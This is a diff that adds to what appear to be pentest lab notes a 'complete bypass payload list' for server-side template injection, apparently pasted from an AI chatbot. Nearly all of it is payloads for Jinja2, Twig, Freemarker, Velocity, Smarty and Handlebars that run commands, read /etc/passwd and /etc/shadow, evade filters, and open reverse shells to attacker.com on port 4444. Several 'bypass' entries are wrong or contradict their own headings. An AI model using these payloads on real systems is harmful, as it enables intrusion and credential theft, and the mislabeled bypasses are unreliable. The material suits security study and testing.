@@ -783,3 +783,292 @@ The solution is directly in https://book.hacktricks.xyz/pentesting-web/ssti-serv
 ![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/9.png)
 
 
+Below is the **Server-Side Template Injection (SSTI) – Complete Bypass Payload List**, written in the **exact same format** as your previous collections (Host Header / CORS / XXE / SSRF / Request Smuggling / OS Command Injection).
+
+This includes **polyglots, blind payloads, sandbox escapes, filter bypass, framework-specific payloads (Jinja2, Twig, Freemarker, Velocity, Smarty, Liquid, Handlebars), encoding bypass, space bypass**, and **real exploitation payloads used in pentests & bug bounties**.
+
+---
+
+# ⭐ **Server-Side Template Injection (SSTI) – Complete Bypass Payload List**
+
+---
+
+# **1. Core SSTI Detection Payloads**
+
+### Basic arithmetic tests
+
+```
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+```
+
+### String concatenation
+
+```
+{{ 'test' + 'ing' }}
+${"test" + "ing"}
+```
+
+---
+
+# **2. Universal SSTI Detection Polyglots**
+
+```
+${{7*7}}
+{{7*7}}
+<%=7*7%>
+${{().__class__.__mro__[1].__subclasses__()}}
+```
+
+---
+
+# **3. Jinja2 / Flask (Python) Payloads**
+
+### **Command Execution**
+
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }}
+```
+
+### **Read File**
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+```
+
+### **Get Subclasses**
+
+```
+{{ [].__class__.__mro__[1].__subclasses__() }}
+```
+
+---
+
+# **4. Twig (PHP)**
+
+### **Code Execution**
+
+```
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+```
+
+### **Read File**
+
+```
+{{ source('/etc/passwd') }}
+```
+
+---
+
+# **5. Freemarker (Java)**
+
+### **Command Execution**
+
+```
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+### **File Read**
+
+```
+<#assign x = "freemarker.template.utility.ObjectConstructor"?new()>
+${x("java.io.FileReader","/etc/passwd")}
+```
+
+---
+
+# **6. Velocity (Java)**
+
+### **Execute Commands**
+
+```
+#set($x="id")
+#set($rt=$x.class.forName("java.lang.Runtime").getRuntime())
+$rt.exec("id")
+```
+
+---
+
+# **7. Smarty (PHP)**
+
+### **Code Execution**
+
+```
+{php}echo shell_exec('id');{/php}
+```
+
+---
+
+# **8. Handlebars.js (Node.js)**
+
+### **Prototype Pollution → RCE**
+
+```
+{{#with (lookup this "__proto__")}}{{setTimeout "require('child_process').exec('id', console.log)" 100}}{{/with}}
+```
+
+---
+
+# **9. Liquid (Ruby / Shopify)**
+
+### **Escape Sandbox**
+
+```
+{{ ''.class.superclass.superclass }}
+```
+
+---
+
+# **10. Blind SSTI Payloads**
+
+### **Time Delay (Python)**
+
+```
+{{ cycler.__init__.__globals__.os.system("sleep 5") }}
+```
+
+### **Time Delay (Java)**
+
+```
+${"freemarker.template.utility.Execute"?new()("sleep 5")}
+```
+
+---
+
+# **11. Sandbox Escape Payloads**
+
+### **Python Jinja2**
+
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read() }}
+```
+
+### **Java Freemarker**
+
+```
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+```
+
+---
+
+# **12. Bypass Filters: No Dots Allowed**
+
+### Use indexing
+
+```
+{{ ''.__class__ }}
+```
+
+→ blocked (.)
+
+Bypass using:
+
+```
+{{ (''|attr('__class__')) }}
+{{ (''|attr(request.args.x)) }}   # dynamic
+```
+
+---
+
+# **13. Bypass Filters: No Parentheses**
+
+Use implicit call:
+
+```
+{{ request["application"]["__globals__"]["os"]["popen"]("id")["read"]() }}
+```
+
+---
+
+# **14. Bypass Filters: No Quotes**
+
+Use hex encoding:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[40](0x2f6574632f706173737764).read() }}
+```
+
+---
+
+# **15. Bypass Filters: No Letters**
+
+Use operations only:
+
+```
+{{().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
+```
+
+---
+
+# **16. Bypass Filters: No Spaces**
+
+```
+{{().__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+```
+
+or
+
+```
+{{request|attr('__class__')}}
+```
+
+---
+
+# **17. Unicode / Encoding Bypass**
+
+### Replace quotes with Unicode:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[40]("\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064").read() }}
+```
+
+### URL encoding:
+
+```
+%7B%7B7*7%7D%7D
+```
+
+---
+
+# **18. Advanced Payloads (Real-World Pentest)**
+
+### **Full Python RCE**
+
+```
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+### **Reverse Shell**
+
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("bash -i >&/dev/tcp/attacker.com/4444 0>&1") }}
+```
+
+### **Full Java Freemarker RCE Chain**
+
+```
+${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'")}
+```
+
+---
+
+# **19. Full Polyglot RCE Payload (Works on many engines)**
+
+```
+{{''.class.mro[1].subclasses()[40]('/etc/passwd').read()}}
+${"freemarker.template.utility.Execute"?new()("id")}
+<%= Runtime.getRuntime().exec('id') %>
+```
+
+---
+
+# **20. Template-Injection → Deserialization Chain Payloads**
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[118]().load(__import__('os').popen('id').read()) }}
+```
+
+---
+
